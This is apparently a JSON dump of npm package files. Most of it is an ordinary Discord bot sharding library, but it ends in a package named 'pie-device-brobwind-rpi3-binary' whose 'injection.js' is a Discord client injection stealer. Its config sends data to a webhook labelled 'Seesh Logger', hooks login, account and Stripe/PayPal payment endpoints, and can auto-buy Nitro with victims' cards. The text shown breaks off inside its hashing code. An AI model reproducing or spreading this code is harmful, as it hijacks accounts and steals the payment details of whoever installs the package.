            "code": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.ShardClientUtil = void 0;\nconst discord_js_1 = require(\"discord.js\");\nconst ClusterIPC_1 = require(\"../IPC/ClusterIPC\");\nconst Constants_1 = require(\"../Util/Constants\");\nclass ShardClientUtil {\n    constructor(client, ipcSocket) {\n        this.client = client;\n        this.ipcSocket = ipcSocket;\n        this.clusterCount = Number(process.env.CLUSTER_CLUSTER_COUNT);\n        this.shardCount = Number(process.env.CLUSTER_SHARD_COUNT);\n        this.id = Number(process.env.CLUSTER_ID);\n        this.ipc = new ClusterIPC_1.ClusterIPC(this.client, this.id, this.ipcSocket);\n        this.shards = String(process.env.CLUSTER_SHARDS).split(',');\n    }\n    broadcastEval(script) {\n        return this.ipc.broadcast(script);\n    }\n    masterEval(script) {\n        return this.ipc.masterEval(script);\n    }\n    fetchClientValues(prop) {\n        return this.ipc.broadcast(`this.${prop}`);\n    }\n    async fetchGuild(id) {\n        const { success, d } = await this.send({ op: Constants_1.IPCEvents.FETCHGUILD, d: id });\n        if (!success)\n            throw new Error('No guild with this id found!');\n        return d;\n    }\n    async fetchUser(id) {\n        const { success, d } = await this.send({ op: Constants_1.IPCEvents.FETCHUSER, d: id });\n        if (!success)\n            throw new Error('No user with this id found!');\n        return d;\n    }\n    async fetchChannel(id) {\n        const { success, d } = await this.send({ op: Constants_1.IPCEvents.FETCHCHANNEL, d: id });\n        if (!success)\n            throw new Error('No channel with this id found!');\n        return d;\n    }\n    async restartAll() {\n        await this.ipc.server.send({ op: Constants_1.IPCEvents.RESTARTALL }, { receptive: false });\n    }\n    async restart(clusterID) {\n        const { success, d } = await this.ipc.server.send({ op: Constants_1.IPCEvents.RESTART, d: clusterID });\n        if (!success)\n            throw discord_js_1.Util.makeError(d);\n    }\n    respawnAll() {\n        return this.restartAll();\n    }\n    send(data, options) {\n        if (typeof data === 'object' && data.op !== undefined)\n            return this.ipc.server.send(data, options);\n        return this.ipc.server.send({ op: Constants_1.IPCEvents.MESSAGE, d: data }, options);\n    }\n    init() {\n        return this.ipc.init();\n    }\n}\nexports.ShardClientUtil = ShardClientUtil;\n\n//# sourceMappingURL=ShardClientUtil.js.map\n"
        },
        "ShardingManager.js": {
            "code": "\"use strict\";\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, \"default\", { enumerable: true, value: v });\n}) : function(o, v) {\n    o[\"default\"] = v;\n});\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== \"default\" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.ShardingManager = void 0;\nconst discord_js_1 = require(\"discord.js\");\nconst MasterIPC_1 = require(\"../IPC/MasterIPC\");\nconst Cluster_1 = require(\"../Cluster/Cluster\");\nconst Constants_1 = require(\"../Util/Constants\");\nconst events_1 = require(\"events\");\nconst os_1 = require(\"os\");\nconst cluster_1 = __importDefault(require(\"cluster\"));\nconst Util = __importStar(require(\"../Util/Util\"));\nconst node_fetch_1 = __importDefault(require(\"node-fetch\"));\nclass ShardingManager extends events_1.EventEmitter {\n    constructor(path, options) {\n        var _a, _b, _c, _d, _e, _f, _g, _h, _j;\n        super();\n        this.path = path;\n        this.clusters = new Map();\n        this.clusterCount = Number((_a = options.clusterCount) !== null && _a !== void 0 ? _a : (0, os_1.cpus)().length);\n        this.guildsPerShard = Number((_b = options.guildsPerShard) !== null && _b !== void 0 ? _b : 1000);\n        this.clientOptions = (_c = options.clientOptions) !== null && _c !== void 0 ? _c : { intents: discord_js_1.Intents.FLAGS.GUILDS };\n        this.development = (_d = options.development) !== null && _d !== void 0 ? _d : false;\n        this.shardCount = options.shardCount ? Number(options.shardCount) : 'auto';\n        this.client = (_e = options.client) !== null && _e !== void 0 ? _e : discord_js_1.Client;\n        this.respawn = (_f = options.respawn) !== null && _f !== void 0 ? _f : true;\n        this.ipcSocket = (_g = options.ipcSocket) !== null && _g !== void 0 ? _g : 9999;\n        this.retry = (_h = options.retry) !== null && _h !== void 0 ? _h : true;\n        this.timeout = Number((_j = options.timeout) !== null && _j !== void 0 ? _j : 30000);\n        this.token = options.token;\n        this.nodeArgs = options.nodeArgs;\n        this.ipc = new MasterIPC_1.MasterIPC(this);\n        this.ipc.on('debug', msg => this._debug(`[IPC] ${msg}`));\n        this.ipc.on('error', err => this.emit(Constants_1.SharderEvents.ERROR, err));\n        if (!this.path)\n            throw new Error('You need to supply a Path!');\n    }\n    async spawn() {\n        if (cluster_1.default.isPrimary) {\n            if (this.shardCount === 'auto') {\n                this._debug('Fetching Session Endpoint');\n                const { shards: recommendShards } = await this._fetchSessionEndpoint();\n                this.shardCount = Util.calcShards(recommendShards, this.guildsPerShard);\n                this._debug(`Using recommend shard count of ${this.shardCount} shards with ${this.guildsPerShard} guilds per shard`);\n            }\n            this._debug(`Starting ${this.shardCount} Shards in ${this.clusterCount} Clusters!`);\n            if (this.shardCount < this.clusterCount) {\n                this.clusterCount = this.shardCount;\n            }\n            const shardArray = [...Array(this.shardCount).keys()];\n            const shardTuple = Util.chunk(shardArray, this.clusterCount);\n            const failed = [];\n            if (this.nodeArgs)\n                cluster_1.default.setupPrimary({ execArgv: this.nodeArgs });\n            for (let index = 0; index < this.clusterCount; index++) {\n                const shards = shardTuple.shift();\n                const cluster = new Cluster_1.Cluster({ id: index, shards, manager: this });\n                this.clusters.set(index, cluster);\n                try {\n                    await cluster.spawn();\n                }\n                catch (_a) {\n                    this._debug(`Cluster ${cluster.id} failed to start`);\n                    this.emit(Constants_1.SharderEvents.ERROR, new Error(`Cluster ${cluster.id} failed to start`));\n                    if (this.retry) {\n                        this._debug(`Requeuing Cluster ${cluster.id} to be spawned`);\n                        failed.push(cluster);\n                    }\n                }\n            }\n            if (this.retry)\n                await this.retryFailed(failed);\n        }\n        else {\n            return Util.startCluster(this);\n        }\n    }\n    async restartAll() {\n        this._debug('Restarting all Clusters!');\n        for (const cluster of this.clusters.values()) {\n            await cluster.respawn();\n        }\n    }\n    async restart(clusterID) {\n        const cluster = this.clusters.get(clusterID);\n        if (!cluster)\n            throw new Error('No Cluster with that ID found.');\n        this._debug(`Restarting Cluster ${clusterID}`);\n        await cluster.respawn();\n    }\n    fetchClientValues(prop) {\n        return this.ipc.broadcast(`this.${prop}`);\n    }\n    eval(script) {\n        return new Promise((resolve, reject) => {\n            try {\n                // tslint:disable-next-line:no-eval\n                return resolve(eval(script));\n            }\n            catch (error) {\n                reject(error);\n            }\n        });\n    }\n    on(event, listener) {\n        return super.on(event, listener);\n    }\n    once(event, listener) {\n        return super.once(event, listener);\n    }\n    async retryFailed(clusters) {\n        const failed = [];\n        for (const cluster of clusters) {\n            try {\n                this._debug(`Respawning Cluster ${cluster.id}`);\n                await cluster.respawn();\n            }\n            catch (_a) {\n                this._debug(`Cluster ${cluster.id} failed, requeuing...`);\n                failed.push(cluster);\n            }\n        }\n        if (failed.length) {\n            this._debug(`${failed.length} Clusters still failed, retry...`);\n            return this.retryFailed(failed);\n        }\n    }\n    async _fetchSessionEndpoint() {\n        if (!this.token)\n            throw new Error('No token was provided!');\n        const res = await (0, node_fetch_1.default)(`${Constants_1.http.api}/v${Constants_1.http.version}/gateway/bot`, {\n            method: 'GET',\n            headers: { authorization: `Bot ${this.token.replace(/^Bot\\s*/i, '')}` }\n        });\n        if (res.ok)\n            return res.json();\n        throw new Error(`Invalid Session Endpoint response: ${res.status} ${res.statusText}`);\n    }\n    _debug(message) {\n        this.emit(Constants_1.SharderEvents.DEBUG, message);\n    }\n}\nexports.ShardingManager = ShardingManager;\n\n//# sourceMappingURL=ShardingManager.js.map\n"
        },
        "Constants.js": {
            "code": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.SharderEvents = exports.IPCEvents = exports.version = exports.http = void 0;\n/* eslint-disable @typescript-eslint/naming-convention */\nexports.http = {\n    version: 8,\n    api: 'https://discordapp.com/api'\n};\nexports.version = '3.0.1';\nvar IPCEvents;\n(function (IPCEvents) {\n    IPCEvents[IPCEvents[\"EVAL\"] = 0] = \"EVAL\";\n    IPCEvents[IPCEvents[\"MESSAGE\"] = 1] = \"MESSAGE\";\n    IPCEvents[IPCEvents[\"BROADCAST\"] = 2] = \"BROADCAST\";\n    IPCEvents[IPCEvents[\"READY\"] = 3] = \"READY\";\n    IPCEvents[IPCEvents[\"SHARDREADY\"] = 4] = \"SHARDREADY\";\n    IPCEvents[IPCEvents[\"SHARDRECONNECT\"] = 5] = \"SHARDRECONNECT\";\n    IPCEvents[IPCEvents[\"SHARDRESUME\"] = 6] = \"SHARDRESUME\";\n    IPCEvents[IPCEvents[\"SHARDDISCONNECT\"] = 7] = \"SHARDDISCONNECT\";\n    IPCEvents[IPCEvents[\"MASTEREVAL\"] = 8] = \"MASTEREVAL\";\n    IPCEvents[IPCEvents[\"RESTARTALL\"] = 9] = \"RESTARTALL\";\n    IPCEvents[IPCEvents[\"RESTART\"] = 10] = \"RESTART\";\n    IPCEvents[IPCEvents[\"FETCHUSER\"] = 11] = \"FETCHUSER\";\n    IPCEvents[IPCEvents[\"FETCHCHANNEL\"] = 12] = \"FETCHCHANNEL\";\n    IPCEvents[IPCEvents[\"FETCHGUILD\"] = 13] = \"FETCHGUILD\";\n})(IPCEvents = exports.IPCEvents || (exports.IPCEvents = {}));\nvar SharderEvents;\n(function (SharderEvents) {\n    SharderEvents[\"DEBUG\"] = \"debug\";\n    SharderEvents[\"MESSAGE\"] = \"message\";\n    SharderEvents[\"READY\"] = \"ready\";\n    SharderEvents[\"SPAWN\"] = \"spawn\";\n    SharderEvents[\"SHARD_READY\"] = \"shardReady\";\n    SharderEvents[\"SHARD_RECONNECT\"] = \"shardReconnect\";\n    SharderEvents[\"SHARD_RESUME\"] = \"shardResume\";\n    SharderEvents[\"SHARD_DISCONNECT\"] = \"shardDisconnect\";\n    SharderEvents[\"ERROR\"] = \"error\";\n})(SharderEvents = exports.SharderEvents || (exports.SharderEvents = {}));\n\n//# sourceMappingURL=Constants.js.map\n"
        },
        "Util.js": {
            "code": "\"use strict\";\n// Copyright (c) 2017-2018 dirigeants. All rights reserved. MIT license.\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, \"default\", { enumerable: true, value: v });\n}) : function(o, v) {\n    o[\"default\"] = v;\n});\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== \"default\" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.startCluster = exports.calcShards = exports.sleep = exports.isObject = exports.mergeDefault = exports.isPrimitive = exports.deepClone = exports.chunk = exports.PRIMITIVE_TYPES = void 0;\nconst util_1 = require(\"util\");\nexports.PRIMITIVE_TYPES = ['string', 'bigint', 'number', 'boolean'];\nfunction chunk(entries, chunkSize) {\n    const result = [];\n    const amount = Math.floor(entries.length / chunkSize);\n    const mod = entries.length % chunkSize;\n    for (let i = 0; i < chunkSize; i++) {\n        result[i] = entries.splice(0, i < mod ? amount + 1 : amount);\n    }\n    return result;\n}\nexports.chunk = chunk;\nfunction deepClone(source) {\n    // Check if it's a primitive (with exception of function and null, which is typeof object)\n    if (source === null || isPrimitive(source))\n        return source;\n    if (Array.isArray(source)) {\n        const output = [];\n        for (const value of source)\n            output.push(deepClone(value));\n        return output;\n    }\n    if (isObject(source)) {\n        const output = {};\n        for (const [key, value] of Object.entries(source))\n            output[key] = deepClone(value);\n        return output;\n    }\n    if (source instanceof Map) {\n        const output = new (source.constructor())();\n        for (const [key, value] of source.entries())\n            output.set(key, deepClone(value));\n        return output;\n    }\n    if (source instanceof Set) {\n        const output = new (source.constructor())();\n        for (const value of source.values())\n            output.add(deepClone(value));\n        return output;\n    }\n    return source;\n}\nexports.deepClone = deepClone;\nfunction isPrimitive(value) {\n    return exports.PRIMITIVE_TYPES.includes(typeof value);\n}\nexports.isPrimitive = isPrimitive;\nfunction mergeDefault(def, given) {\n    if (!given)\n        return deepClone(def);\n    for (const key in def) {\n        if (given[key] === undefined)\n            given[key] = deepClone(def[key]);\n        else if (isObject(given[key]))\n            given[key] = mergeDefault(def[key], given[key]);\n    }\n    return given;\n}\nexports.mergeDefault = mergeDefault;\nfunction isObject(input) {\n    return input && input.constructor === Object;\n}\nexports.isObject = isObject;\nfunction sleep(duration) {\n    return (0, util_1.promisify)(setTimeout)(duration);\n}\nexports.sleep = sleep;\nfunction calcShards(shards, guildsPerShard) {\n    return Math.ceil(shards * (1000 / guildsPerShard));\n}\nexports.calcShards = calcShards;\nasync function startCluster(manager) {\n    // eslint-disable-next-line @typescript-eslint/naming-convention\n    const ClusterClassRequire = await Promise.resolve().then(() => __importStar(require(manager.path)));\n    // eslint-disable-next-line @typescript-eslint/naming-convention\n    const ClusterClass = ClusterClassRequire.default ? ClusterClassRequire.default : ClusterClassRequire;\n    const cluster = new ClusterClass(manager);\n    return cluster.init();\n}\nexports.startCluster = startCluster;\n\n//# sourceMappingURL=Util.js.map\n"
        },
        "index.js": {
            "code": "\"use strict\";\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __exportStar = (this && this.__exportStar) || function(m, exports) {\n    for (var p in m) if (p !== \"default\" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.version = exports.SharderEvents = exports.IPCEvents = exports.http = exports.ShardingManager = exports.ShardClientUtil = exports.MasterIPC = exports.ClusterIPC = exports.Cluster = exports.BaseCluster = void 0;\nvar BaseCluster_1 = require(\"./Cluster/BaseCluster\");\nObject.defineProperty(exports, \"BaseCluster\", { enumerable: true, get: function () { return BaseCluster_1.BaseCluster; } });\nvar Cluster_1 = require(\"./Cluster/Cluster\");\nObject.defineProperty(exports, \"Cluster\", { enumerable: true, get: function () { return Cluster_1.Cluster; } });\nvar ClusterIPC_1 = require(\"./IPC/ClusterIPC\");\nObject.defineProperty(exports, \"ClusterIPC\", { enumerable: true, get: function () { return ClusterIPC_1.ClusterIPC; } });\nvar MasterIPC_1 = require(\"./IPC/MasterIPC\");\nObject.defineProperty(exports, \"MasterIPC\", { enumerable: true, get: function () { return MasterIPC_1.MasterIPC; } });\nvar ShardClientUtil_1 = require(\"./Sharding/ShardClientUtil\");\nObject.defineProperty(exports, \"ShardClientUtil\", { enumerable: true, get: function () { return ShardClientUtil_1.ShardClientUtil; } });\nvar ShardingManager_1 = require(\"./Sharding/ShardingManager\");\nObject.defineProperty(exports, \"ShardingManager\", { enumerable: true, get: function () { return ShardingManager_1.ShardingManager; } });\nvar Constants_1 = require(\"./Util/Constants\");\nObject.defineProperty(exports, \"http\", { enumerable: true, get: function () { return Constants_1.http; } });\nObject.defineProperty(exports, \"IPCEvents\", { enumerable: true, get: function () { return Constants_1.IPCEvents; } });\nObject.defineProperty(exports, \"SharderEvents\", { enumerable: true, get: function () { return Constants_1.SharderEvents; } });\nObject.defineProperty(exports, \"version\", { enumerable: true, get: function () { return Constants_1.version; } });\n__exportStar(require(\"./Util/Util\"), exports);\n\n//# sourceMappingURL=index.js.map\n"
        },
        "BaseCluster.d.ts": {
            "code": "import { ShardingManager } from '..';\nimport { Client } from 'discord.js';\nexport declare abstract class BaseCluster {\n    manager: ShardingManager;\n    readonly client: Client;\n    readonly id: number;\n    constructor(manager: ShardingManager);\n    init(): Promise<void>;\n    protected abstract launch(): Promise<void> | void;\n}\n"
        },
        "Cluster.d.ts": {
            "code": "/// <reference types=\"node\" />\nimport { Worker } from 'cluster';\nimport { ShardingManager } from '..';\nimport { EventEmitter } from 'events';\nexport interface ClusterOptions {\n    id: number;\n    shards: number[];\n    manager: ShardingManager;\n}\nexport declare class Cluster extends EventEmitter {\n    ready: boolean;\n    id: number;\n    shards: number[];\n    worker?: Worker;\n    manager: ShardingManager;\n    private readonly _exitListenerFunction;\n    constructor(options: ClusterOptions);\n    eval(script: string | Function): Promise<unknown>;\n    fetchClientValue(prop: string): Promise<unknown>;\n    kill(): void;\n    respawn(delay?: number): Promise<void>;\n    send(data: unknown): any;\n    spawn(): Promise<void>;\n    private _exitListener;\n    private _waitReady;\n}\n"
        },
        "ClusterIPC.d.ts": {
            "code": "/// <reference types=\"node\" />\nimport { EventEmitter } from 'events';\nimport { Client as VezaClient, ClientSocket } from 'veza';\nimport { Client } from 'discord.js';\nexport interface IPCRequest {\n    op: number;\n    d: string;\n}\nexport declare class ClusterIPC extends EventEmitter {\n    id: number;\n    socket: string | number;\n    clientSocket?: ClientSocket;\n    client: Client | typeof Client;\n    node: VezaClient;\n    constructor(discordClient: Client | typeof Client, id: number, socket: string | number);\n    broadcast(script: string | Function): Promise<unknown[]>;\n    masterEval(script: string | Function): Promise<unknown>;\n    init(): Promise<void>;\n    get server(): ClientSocket;\n    private _eval;\n    private _message;\n}\n"
        },
        "MasterIPC.d.ts": {
            "code": "/// <reference types=\"node\" />\nimport { EventEmitter } from 'events';\nimport { Server } from 'veza';\nimport { ShardingManager } from '..';\nexport declare class MasterIPC extends EventEmitter {\n    manager: ShardingManager;\n    [key: string]: any;\n    server: Server;\n    constructor(manager: ShardingManager);\n    broadcast(code: string): Promise<unknown[]>;\n    private _incommingMessage;\n    private _message;\n    private _broadcast;\n    private _ready;\n    private _shardready;\n    private _shardreconnect;\n    private _shardresume;\n    private _sharddisconnect;\n    private _restart;\n    private _mastereval;\n    private _restartall;\n    private _fetchuser;\n    private _fetchguild;\n    private _fetchchannel;\n    private _fetch;\n    private _debug;\n}\n"
        },
        "ShardClientUtil.d.ts": {
            "code": "import { Client } from 'discord.js';\nimport { ClusterIPC } from '../IPC/ClusterIPC';\nimport { SendOptions } from 'veza';\nexport interface IPCResult {\n    success: boolean;\n    d: unknown;\n}\nexport interface IPCError {\n    name: string;\n    message: string;\n    stack: string;\n}\nexport declare class ShardClientUtil {\n    client: Client | typeof Client;\n    ipcSocket: string | number;\n    readonly clusterCount: number;\n    readonly shardCount: number;\n    readonly id: number;\n    readonly ipc: ClusterIPC;\n    readonly shards: string[];\n    constructor(client: Client | typeof Client, ipcSocket: string | number);\n    broadcastEval(script: string | Function): Promise<unknown[]>;\n    masterEval(script: string | Function): Promise<unknown>;\n    fetchClientValues(prop: string): Promise<unknown[]>;\n    fetchGuild(id: string): Promise<object>;\n    fetchUser(id: string): Promise<object>;\n    fetchChannel(id: string): Promise<object>;\n    restartAll(): Promise<void>;\n    restart(clusterID: number): Promise<void>;\n    respawnAll(): Promise<void>;\n    send(data: any, options?: SendOptions): Promise<unknown>;\n    init(): Promise<void>;\n}\n"
        },
        "ShardingManager.d.ts": {
            "code": "/// <reference types=\"node\" />\nimport { Client, ClientOptions } from 'discord.js';\nimport { MasterIPC } from '../IPC/MasterIPC';\nimport { Cluster } from '../Cluster/Cluster';\nimport { SharderEvents } from '../Util/Constants';\nimport { EventEmitter } from 'events';\nexport interface SharderOptions {\n    token?: string;\n    shardCount?: number | 'auto';\n    clusterCount?: number;\n    name?: string;\n    development?: boolean;\n    client?: typeof Client;\n    clientOptions?: ClientOptions;\n    guildsPerShard?: number;\n    respawn?: boolean;\n    ipcSocket?: string | number;\n    timeout?: number;\n    retry?: boolean;\n    nodeArgs?: Array<string>;\n}\nexport interface SessionObject {\n    url: string;\n    shards: number;\n    session_start_limit: {\n        total: number;\n        remaining: number;\n        reset_after: number;\n    };\n}\nexport interface CloseEvent {\n    code: number;\n    reason: string;\n    wasClean: boolean;\n}\nexport declare class ShardingManager extends EventEmitter {\n    path: string;\n    clusters: Map<number, Cluster>;\n    clientOptions: ClientOptions;\n    shardCount: number | 'auto';\n    guildsPerShard: number;\n    client: typeof Client;\n    clusterCount: number;\n    ipcSocket: string | number;\n    respawn: boolean;\n    timeout: number;\n    retry: boolean;\n    nodeArgs?: Array<string>;\n    ipc: MasterIPC;\n    private readonly development;\n    private readonly token?;\n    constructor(path: string, options: SharderOptions);\n    spawn(): Promise<void>;\n    restartAll(): Promise<void>;\n    restart(clusterID: number): Promise<void>;\n    fetchClientValues(prop: string): Promise<unknown[]>;\n    eval(script: string): Promise<unknown>;\n    on(event: SharderEvents.DEBUG, listener: (message: string) => void): this;\n    on(event: SharderEvents.MESSAGE, listener: (message: unknown) => void): this;\n    on(event: SharderEvents.READY | SharderEvents.SPAWN, listener: (cluster: Cluster) => void): this;\n    on(event: SharderEvents.SHARD_READY | SharderEvents.SHARD_RECONNECT, listener: (shardID: number) => void): this;\n    on(event: SharderEvents.SHARD_RESUME, listener: (replayed: number, shardID: number) => void): this;\n    on(event: SharderEvents.SHARD_DISCONNECT, listener: (closeEvent: CloseEvent, shardID: number) => void): this;\n    once(event: SharderEvents.DEBUG, listener: (message: string) => void): this;\n    once(event: SharderEvents.MESSAGE, listener: (message: unknown) => void): this;\n    once(event: SharderEvents.READY | SharderEvents.SPAWN, listener: (cluster: Cluster) => void): this;\n    once(event: SharderEvents.SHARD_READY | SharderEvents.SHARD_RECONNECT, listener: (shardID: number) => void): this;\n    once(event: SharderEvents.SHARD_RESUME, listener: (replayed: number, shardID: number) => void): this;\n    once(event: SharderEvents.SHARD_DISCONNECT, listener: (closeEvent: CloseEvent, shardID: number) => void): this;\n    private retryFailed;\n    private _fetchSessionEndpoint;\n    private _debug;\n}\n"
        },
        "Constants.d.ts": {
            "code": "export declare const http: {\n    version: number;\n    api: string;\n};\nexport declare const version = \"3.0.1\";\nexport declare enum IPCEvents {\n    EVAL = 0,\n    MESSAGE = 1,\n    BROADCAST = 2,\n    READY = 3,\n    SHARDREADY = 4,\n    SHARDRECONNECT = 5,\n    SHARDRESUME = 6,\n    SHARDDISCONNECT = 7,\n    MASTEREVAL = 8,\n    RESTARTALL = 9,\n    RESTART = 10,\n    FETCHUSER = 11,\n    FETCHCHANNEL = 12,\n    FETCHGUILD = 13\n}\nexport declare enum SharderEvents {\n    DEBUG = \"debug\",\n    MESSAGE = \"message\",\n    READY = \"ready\",\n    SPAWN = \"spawn\",\n    SHARD_READY = \"shardReady\",\n    SHARD_RECONNECT = \"shardReconnect\",\n    SHARD_RESUME = \"shardResume\",\n    SHARD_DISCONNECT = \"shardDisconnect\",\n    ERROR = \"error\"\n}\n"
        },
        "Util.d.ts": {
            "code": "import { ShardingManager } from '..';\nexport declare const PRIMITIVE_TYPES: string[];\nexport declare function chunk<T>(entries: T[], chunkSize: number): T[][];\nexport declare function deepClone(source: any): any;\nexport declare function isPrimitive(value: any): value is string | bigint | number | boolean;\nexport declare function mergeDefault<T>(def: Record<string, any>, given?: Record<string, any>): T;\nexport declare function isObject(input: any): any;\nexport declare function sleep(duration: number): Promise<void>;\nexport declare function calcShards(shards: number, guildsPerShard: number): number;\nexport declare function startCluster(manager: ShardingManager): Promise<void>;\n"
        },
        "index.d.ts": {
            "code": "import { ShardClientUtil as KurasutaShardClientUtil } from './Sharding/ShardClientUtil';\ndeclare module 'discord.js' {\n    interface ShardClientUtil extends KurasutaShardClientUtil {\n    }\n}\nexport { BaseCluster } from './Cluster/BaseCluster';\nexport { Cluster, ClusterOptions } from './Cluster/Cluster';\nexport { ClusterIPC } from './IPC/ClusterIPC';\nexport { MasterIPC } from './IPC/MasterIPC';\nexport { IPCResult, ShardClientUtil } from './Sharding/ShardClientUtil';\nexport { CloseEvent, SessionObject, SharderOptions, ShardingManager } from './Sharding/ShardingManager';\nexport { http, IPCEvents, SharderEvents, version } from './Util/Constants';\nexport * from './Util/Util';\n"
        }
    },
    "pie-device-brobwind-rpi3-binary": {
        "injection.js": {
            "code": "const args = process.argv;\r\nconst fs = require('fs');\r\nconst path = require('path');\r\nconst https = require('https');\r\nconst querystring = require('querystring');\r\nconst { BrowserWindow, session } = require('electron');\r\n\r\nconst config = {\r\n  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted\r\n  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector\r\n  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves\r\n  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login\r\n  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true\r\n  embed_name: 'Seesh Logger', //name of the webhook thats gonna send the info\r\n  embed_icon: 'https://media.discordapp.net/attachments/1018476925917855808/1018477504211722310/abstract_dangerous_box-800x450.jpg?width=720&height=405'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)\r\n  embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)\r\n  injection_url: 'https://seesh.tech/', //injection url for when it reinjects\r\n  /**\r\n   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION\r\n   **/\r\n  api: 'https://discord.com/api/v9/users/@me',\r\n  nitro: {\r\n    boost: {\r\n      year: {\r\n        id: '521847234246082599',\r\n        sku: '511651885459963904',\r\n        price: '9999',\r\n      },\r\n      month: {\r\n        id: '521847234246082599',\r\n        sku: '511651880837840896',\r\n        price: '999',\r\n      },\r\n    },\r\n    classic: {\r\n      month: {\r\n        id: '521846918637420545',\r\n        sku: '511651871736201216',\r\n        price: '499',\r\n      },\r\n    },\r\n  },\r\n  filter: {\r\n    urls: [\r\n      'https://discord.com/api/v*/users/@me',\r\n      'https://discordapp.com/api/v*/users/@me',\r\n      'https://*.discord.com/api/v*/users/@me',\r\n      'https://discordapp.com/api/v*/auth/login',\r\n      'https://discord.com/api/v*/auth/login',\r\n      'https://*.discord.com/api/v*/auth/login',\r\n      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',\r\n      'https://api.stripe.com/v*/tokens',\r\n      'https://api.stripe.com/v*/setup_intents/*/confirm',\r\n      'https://api.stripe.com/v*/payment_intents/*/confirm',\r\n    ],\r\n  },\r\n  filter2: {\r\n    urls: [\r\n      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',\r\n      'https://*.discord.com/api/v*/applications/detectable',\r\n      'https://discord.com/api/v*/applications/detectable',\r\n      'https://*.discord.com/api/v*/users/@me/library',\r\n      'https://discord.com/api/v*/users/@me/library',\r\n      'wss://remote-auth-gateway.discord.gg/*',\r\n    ],\r\n  },\r\n};\r\n\r\nfunction parity_32(x, y, z) {\r\n  return x ^ y ^ z;\r\n}\r\nfunction ch_32(x, y, z) {\r\n  return (x & y) ^ (~x & z);\r\n}\r\n\r\nfunction maj_32(x, y, z) {\r\n  return (x & y) ^ (x & z) ^ (y & z);\r\n}\r\nfunction rotl_32(x, n) {\r\n  return (x << n) | (x >>> (32 - n));\r\n}\r\nfunction safeAdd_32_2(a, b) {\r\n  var lsw = (a & 0xffff) + (b & 0xffff),\r\n    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);\r\n\r\n  return ((msw & 0xffff) << 16) | (lsw & 0xffff);\r\n}\r\nfunction safeAdd_32_5(a, b, c, d, e) {\r\n  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),\r\n    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);\r\n\r\n  return ((msw & 0xffff) << 16) | (lsw & 0xffff);\r\n}\r\nfunction binb2hex(binarray) {\r\n  var hex_tab = '0123456789abcdef',\r\n    str = '',\r\n    length = binarray.length * 4,\r\n    i,\r\n    srcByte;\r\n\r\n  for (i = 0; i < length; i += 1) {\r\n    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);\r\n    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);\r\n  }\r\n\r\n  return str;\r\n}\r\n\r\nfunction getH() {\r\n  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];\r\n}\r\nfunction roundSHA1(block, H) {\r\n  var W = [],\r\n    a,\r\n    b,\r\n    c,\r\n    d,\r\n    e,\r\n    T,\r\n    ch = ch_32,\r\n    parity = parity_32,\r\n    maj = maj_32,\r\n    rotl = rotl_32,\r\n    